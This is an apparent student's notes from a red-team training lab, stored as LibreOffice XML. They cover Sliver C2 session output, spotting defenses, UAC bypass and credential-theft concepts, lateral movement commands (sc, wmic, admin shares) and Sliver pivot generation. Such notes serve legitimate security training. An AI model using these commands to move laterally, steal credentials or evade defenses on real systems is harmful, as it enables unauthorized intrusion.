      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:soft-page-break/><text:s text:c="8"/>Session ID: a895cd49-30e9-474e-858f-65b480c358c1</text:p>
      <text:p text:style-name="P9"><text:s text:c="14"/>Name: icb_https</text:p>
      <text:p text:style-name="P9"><text:s text:c="10"/>Hostname: WKS0</text:p>
      <text:p text:style-name="P9"><text:s text:c="14"/>UUID: ec26e01b-455c-a878-5dc3-b3e100c04e1d</text:p>
      <text:p text:style-name="P9"><text:s text:c="10"/>Username: WKS0\Stilgar</text:p>
      <text:p text:style-name="P9"><text:s text:c="15"/>UID: S-1-5-21-2073474462-3088345025-183718192-1008</text:p>
      <text:p text:style-name="P9"><text:s text:c="15"/>GID: S-1-5-21-2073474462-3088345025-183718192-513</text:p>
      <text:p text:style-name="P9"><text:s text:c="15"/>PID: 836</text:p>
      <text:p text:style-name="P9"><text:s text:c="16"/>OS: windows</text:p>
      <text:p text:style-name="P9"><text:s text:c="11"/>Version: Server 2016 build 17763 x86_64</text:p>
      <text:p text:style-name="P9"><text:s text:c="12"/>Locale: en-US</text:p>
      <text:p text:style-name="P9"><text:s text:c="14"/>Arch: amd64</text:p>
      <text:p text:style-name="P9"><text:s text:c="9"/>Active C2: https://172.25.255.102</text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/>Remote Address: 172.25.2.101:49952</text:p>
      <text:p text:style-name="P9"><text:s text:c="9"/>Proxy URL: </text:p>
      <text:p text:style-name="P9">Reconnect Interval: 1m0s</text:p>
      <text:p text:style-name="P9"><text:s text:c="5"/>First Contact: Wed Jul <text:s/>5 13:40:04 UTC 2023 (1h27m10s ago)</text:p>
      <text:p text:style-name="P9"><text:s text:c="6"/>Last Checkin: Wed Jul <text:s/>5 15:07:13 UTC 2023 (1s ago)</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">“<text:span text:style-name="T19">ps” → find important users running important processes, helps get permissions</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">ls</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/>Directory: C:\Users\PAtreides\Favorites</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Mode <text:s text:c="15"/>LastWriteTime <text:s text:c="8"/>Length Name <text:s text:c="45"/></text:p>
      <text:p text:style-name="P9">---- <text:s text:c="15"/>------------- <text:s text:c="8"/>------ ---- <text:s text:c="45"/></text:p>
      <text:p text:style-name="P9">d-r--- <text:s text:c="8"/>7/5/2023 <text:s text:c="2"/>7:04 AM <text:s text:c="15"/>Links <text:s text:c="44"/></text:p>
      <text:p text:style-name="P9">-a---- <text:s text:c="8"/>7/5/2023 <text:s text:c="2"/>7:04 AM <text:s text:c="11"/>208 Bing.url <text:s text:c="41"/></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:soft-page-break/>PS C:\Users\PAtreides\Favorites&gt; cat Bing.url</text:p>
      <text:p text:style-name="P9">cat Bing.url</text:p>
      <text:p text:style-name="P9">[{000214A0-0000-0000-C000-000000000046}]</text:p>
      <text:p text:style-name="P9">Prop3=19,2</text:p>
      <text:p text:style-name="P9">[InternetShortcut]</text:p>
      <text:p text:style-name="P9">IDList=</text:p>
      <text:p text:style-name="P9">URL=http://go.microsoft.com/fwlink/p/?LinkId=255142</text:p>
      <text:p text:style-name="P9">IconIndex=0</text:p>
      <text:p text:style-name="P9">IconFile=%ProgramFiles%\Internet Explorer\Images\bing.ico</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s/>2136 <text:s text:c="2"/>604 <text:s text:c="34"/>x86_64 <text:s text:c="2"/>MsMpEng.exe <text:s text:c="14"/>0 <text:s text:c="6"/></text:p>
      <text:p text:style-name="P9"><text:s/>2144 <text:s text:c="2"/>604 <text:s text:c="3"/>NT AUTHORITY\SYSTEM <text:s text:c="11"/>x86_64 <text:s text:c="2"/>svchost.exe <text:s text:c="14"/>0 <text:s text:c="6"/></text:p>
      <text:p text:style-name="P9"><text:s/>2668 <text:s text:c="2"/>1276 <text:s text:c="2"/>NT AUTHORITY\SYSTEM <text:s text:c="11"/>x86_64 <text:s text:c="2"/>ssm-agent-worker.exe <text:s text:c="5"/>0 <text:s text:c="6"/></text:p>
      <text:p text:style-name="P9"><text:s/>1928 <text:s text:c="2"/>2668 <text:s text:c="2"/>NT AUTHORITY\SYSTEM <text:s text:c="11"/>x86_64 <text:s text:c="2"/>conhost.exe <text:s text:c="14"/>0 <text:s text:c="6"/></text:p>
      <text:p text:style-name="P9"><text:s/>2972 <text:s text:c="2"/>1392 <text:s text:c="2"/>RT1\PAtreides <text:s text:c="17"/>x86_64 <text:s text:c="2"/>sihost.exe <text:s text:c="15"/>1 <text:s text:c="6"/></text:p>
      <text:p text:style-name="P9"><text:s/>2400 <text:s text:c="2"/>604 <text:s text:c="3"/>RT1\PAtreides <text:s text:c="17"/>x86_64 <text:s text:c="2"/>svchost.exe <text:s text:c="14"/>1 <text:s text:c="6"/></text:p>
      <text:p text:style-name="P9"><text:s/>2152 <text:s text:c="2"/>1392 <text:s text:c="2"/>RT1\PAtreides <text:s text:c="17"/>x86_64 <text:s text:c="2"/>taskhostw.exe <text:s text:c="12"/>1 <text:s text:c="6"/></text:p>
      <text:p text:style-name="P9"><text:s/>2600 <text:s text:c="2"/>884 <text:s text:c="3"/>RT1\PAtreides <text:s text:c="17"/>x86_64 <text:s text:c="2"/>ctfmon.exe <text:s text:c="15"/>1 <text:s text:c="6"/></text:p>
      <text:p text:style-name="P9"><text:s/>1012 <text:s text:c="2"/>604 <text:s text:c="3"/>NT AUTHORITY\SYSTEM <text:s text:c="11"/>x86_64 <text:s text:c="2"/>svchost.exe <text:s text:c="14"/>0 <text:s text:c="6"/></text:p>
      <text:p text:style-name="P9"><text:s/>3268 <text:s text:c="2"/>3224 <text:s text:c="2"/>RT1\PAtreides <text:s text:c="17"/>x86_64 <text:s text:c="2"/>explorer.exe <text:s text:c="13"/>1 <text:s text:c="6"/></text:p>
      <text:p text:style-name="P9"><text:s/>3532 <text:s text:c="2"/>728 <text:s text:c="3"/>RT1\PAtreides <text:s text:c="17"/>x86_64 <text:s text:c="2"/>smartscreen.exe <text:s text:c="10"/>1 <text:s text:c="6"/></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P11">**found two defenses enabled (MsMpEng.exe and smartscreen.exe)</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P13">Linux Privileges:</text:p>
      <text:p text:style-name="P25">root-whatever you want</text:p>
      <text:p text:style-name="P25">admin user- can use root</text:p>
      <text:p text:style-name="P25">normal user-stuck in regular privileges</text:p>
      <text:p text:style-name="P25">can sometimes use sudo</text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P29"><text:soft-page-break/>Windows Privileges:</text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T6">-far more complicated</text:span></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T6">-user permisions, can be individually assigned permissions to single things</text:span></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T6">permissions can be set for groups</text:span></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T6">-local admins are roughly equal to sudo permissions </text:span></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T6"/></text:p>
      <text:p text:style-name="P29">Windows Process Integrity:</text:p>
      <text:p text:style-name="P25">extra layer of security, assign each process an integrity level</text:p>
      <text:p text:style-name="P25">-low=not trusted (web browsers, untrusted guess users)</text:p>
      <text:p text:style-name="P25">-medium=most things live here, </text:p>
      <text:p text:style-name="P25">-high integrity=admin processes, what we want as RT</text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P29">User Account Control (UAC):</text:p>
      <text:p text:style-name="P25">requires program to specifically request or be started in a high intensity context</text:p>
      <text:p text:style-name="P25">-requires user to accept a prompt</text:p>
      <text:p text:style-name="P29"/>
      <text:p text:style-name="P29">How to get high integrity?:</text:p>
      <text:p text:style-name="P29">-<text:span text:style-name="T6">fool user to accept admin prompt</text:span></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T6">-accept with interactive log in (RDP, physical access)</text:span></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T6">-UAC bypass, exploits for windows OS to get high integrity without asking – tends to be broken by windows OS security quickly</text:span></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T6">-exploit a process with high integrity, buffer overflows</text:span></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T6">-start a high integrity process over a network with credentials</text:span></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T6"/></text:p>
      <text:p text:style-name="P29">Abuse Credentials:</text:p>
      <text:p text:style-name="P25">-use windows Active Directory, steal credentials</text:p>
      <text:p text:style-name="P18">Find them: </text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T12">- check disk, files, etc for info on credentials</text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T12">- finding password lists, excel files, etc</text:span></text:p>
      <text:p text:style-name="P18">Steal them:</text:p>
      <text:p text:style-name="P25">- every process has a token in windows</text:p>
      <text:p text:style-name="P25">- token = bag with credentials in it</text:p>
      <text:p text:style-name="P25">- windows stores credentials for you once you log in</text:p>
      <text:p text:style-name="P25">- <text:span text:style-name="T20">token allows system to remember where your credentials are</text:span></text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P30"><text:soft-page-break/>Lab 3: credential theft</text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P12">impersonate RT1\\PAtreides</text:p>
      <text:p text:style-name="P12">-<text:span text:style-name="T21">shell, get into shell as diff user, diff permissions, can enumerate more now</text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P31">Lateral Movement:</text:p>
      <text:p text:style-name="P26">-<text:span text:style-name="T9">Windows services </text:span>– admins can manage services remotely by default.</text:p>
      <text:p text:style-name="P26"><text:tab/>-runs callback on NT AUTHORITY/SYSTEM</text:p>
      <text:p text:style-name="P26"><text:tab/>- run command: sc \\TARGET SERVICENAME binPath = path/to/binary</text:p>
      <text:p text:style-name="P19">-scheduled tasks – <text:span text:style-name="T12">choose to run as system or with credentials on target</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T12"><text:tab/>-also be run as admin by default</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T12"><text:tab/>- can run tasks automatically at certain intervals/times</text:span></text:p>
      <text:p text:style-name="P26">-<text:span text:style-name="T9">WMIC – </text:span>wmic <text:span text:style-name="T8">n</text:span>ode TARGET.DOMAIN process call creates a cmd.exe/PAYLOAD.exe in System32 Windows directory</text:p>
      <text:p text:style-name="P26">-require you to have payload on machine you’re pivoting to</text:p>
      <text:p text:style-name="P26">-use smv to file share to target machine</text:p>
      <text:p text:style-name="P26">ls //IP ADDRESS/SHARE_NAME, now looking at file system of other computer</text:p>
      <text:p text:style-name="P26">-c$ = <text:a xlink:type="simple" xlink:href="../../../../../../C:/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">C:/</text:a> on victim machine</text:p>
      <text:p text:style-name="P26">-admin$ = C:/Windows\System32 on victim machine</text:p>
      <text:p text:style-name="P26">-ipc$ - used for inter machine communication</text:p>
      <text:p text:style-name="P26">-can upload files using these $ variables</text:p>
      <text:p text:style-name="P26">-need admin credentials, thats why we pivot to PA for domain/admin controls</text:p>
      <text:p text:style-name="P26">- BLEND IN</text:p>
      <text:p text:style-name="P26">-<text:span text:style-name="T22">https is suspicious coming from a server/domain controller</text:span></text:p>
      <text:p text:style-name="P26">-<text:span text:style-name="T22">dont want to upload an https beacon to a server</text:span></text:p>
      <text:p text:style-name="P26">-<text:span text:style-name="T22">must use </text:span><text:span text:style-name="T3">internal C2/Pivots</text:span></text:p>
      <text:p text:style-name="P26"><text:span text:style-name="T3">- </text:span><text:span text:style-name="T22">allows agents to form a chain with only first hop talking in https back to team server</text:span></text:p>
      <text:p text:style-name="P26">-<text:span text:style-name="T22">commonly use TCP or SMB(Windows Domains)</text:span></text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P32">Sliver Pivots:</text:p>
      <text:p text:style-name="P27">two steps: start a pivot listener on the hop you want to pivot to you</text:p>
      <text:p text:style-name="P27"><text:tab/>-can start a tcp pivot with the -tcp flag</text:p>
      <text:p text:style-name="P27">-generate payload that will talk to your new pivot listener</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/>-generate –tcp-pivot &lt;ip&gt; &lt;path&gt;</text:p>
      <text:p text:style-name="P27">-generate -named-pipe &lt;ip&gt;/pipe/&lt;pipe_name&gt;</text:p>
      <text:p text:style-name="P27">-double check everything matches</text:p>
      <text:p text:style-name="P27">- will give new beacon/callback from new server</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P32">Lab 4: laterally mov</text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P33">Domain Recon:</text:p>
      <text:p text:style-name="P34">sa-<text:span text:style-name="T17">ldapsearch, search for users with “admin” in the name</text:span></text:p>
      <text:p text:style-name="P35">-sa-ldapsearch (objectclass=User)</text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P36">Domain Trusts:</text:p>
      <text:p text:style-name="P35">exist to allow users in sep. domains to use resources in another domain</text:p>
      <text:p text:style-name="P35">- allows a domain to be segemented for ease of manage. + security</text:p>
      <text:p text:style-name="P35">- mutliple types of trust:</text:p>
      <text:p text:style-name="P35"><text:tab/>-bidirectional – both trust each other</text:p>
      <text:p text:style-name="P35"><text:tab/>-One-way Trust – A trusts B, but not vice versa</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P26">-<text:span text:style-name="T23">Enterprise admins – admins of every domain, permissions on every DC of enterprise they control, (C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5T08:07:51.559385587</meta:creation-date>
    <dc:date>2023-07-06T13:13:23.000073429</dc:date>
    <meta:editing-duration>PT45M31S</meta:editing-duration>
    <meta:editing-cycles>6</meta:editing-cycles>
    <meta:generator>LibreOffice/7.3.7.2$Linux_X86_64 LibreOffice_project/30$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="10" meta:paragraph-count="253" meta:word-count="1617" meta:character-count="12389" meta:non-whitespace-character-count="9498"/>
  </office:meta>
</office:document-meta>
</file>